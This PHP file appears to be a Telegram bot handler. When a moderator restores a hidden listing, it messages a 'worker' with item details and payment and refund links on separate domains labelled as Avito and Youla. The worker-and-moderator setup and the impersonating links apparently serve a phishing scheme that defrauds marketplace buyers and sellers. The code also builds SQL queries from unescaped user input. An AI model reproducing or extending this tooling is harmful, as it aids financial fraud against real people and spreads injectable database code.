<?php

	if(preg_match('/\/resadvert/i', $message['text']) == TRUE) {
		if(preg_match('/\/resadvert (.{24}|\d+)/i', $message['text']) == TRUE) {
			$advert_id = mb_substr($message['text'], 11);
			
			$query = mysqli_query($connection, "SELECT `type`, `worker`, `title`, `price`, `delivery` FROM `adverts` WHERE `advert_id` = '$advert_id' AND `status` = '-1'");
			
			if(mysqli_num_rows($query) > 0) {
				$advert = mysqli_fetch_assoc($query);
				mysqli_query($connection, "UPDATE `adverts` SET `status` = '1', `time` = '".time()."' WHERE `advert_id` = '$advert_id'");
				
				if($advert['delivery'] == '0') $advert['delivery'] = $settings['delivery'];
				
				$text = "📮 <b>Модератор восстановил ваше объявление</b> <code>$advert_id</code>\n\n";
				$text .= "<b>Название товара:</b> <code>$advert[title]</code>\n";
				$text .= "<b>Сумма товара:</b> <code>$advert[price] руб.</code>\n";
				$text .= "<b>Сумма доставки:</b> <code>$advert[delivery] руб.</code>\n\n";
				if($advert['type'] == 0) { 
					$text .= "<b>Ссылка на оплату:</b> https://$domains[avito]/buy?id=$advert_id\n";
					$text .= "<b>Ссылка на возврат:</b> https://$domains[avito]/refund?id=$advert_id\n";
				} elseif($advert['type'] == 1) {
					$text .= "<b>Ссылка на оплату:</b> https://$domains[youla]/product/$advert_id/buy/delivery\n";
					$text .= "<b>Ссылка на возврат:</b> https://$domains[youla]/refund/$advert_id/\n";
				}
				send($config['token'], 'sendMessage', Array('chat_id' => $advert['worker'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				$text = "📮 <b>Модератор</b> <a href=\"tg://user?id=$message[from]\">$message[firstname] $message[lastname]</a> <b>восстановил объявление</b> <a href=\"tg://user?id=$advert[worker]\">воркера</a> <code>$advert_id</code>";
				send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['admin'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
				send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			} else {
				$text = "🥴 <b>Объявление не существует или оно не скрыто</b>";
				send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
			}
		} else {
			$text = "❔ Используйте /resadvert <code>[ID объявления]</code>";
			send($config['token'], 'sendMessage', Array('chat_id' => $config['chat']['moders'], 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => 'true'));
		}
	}

?>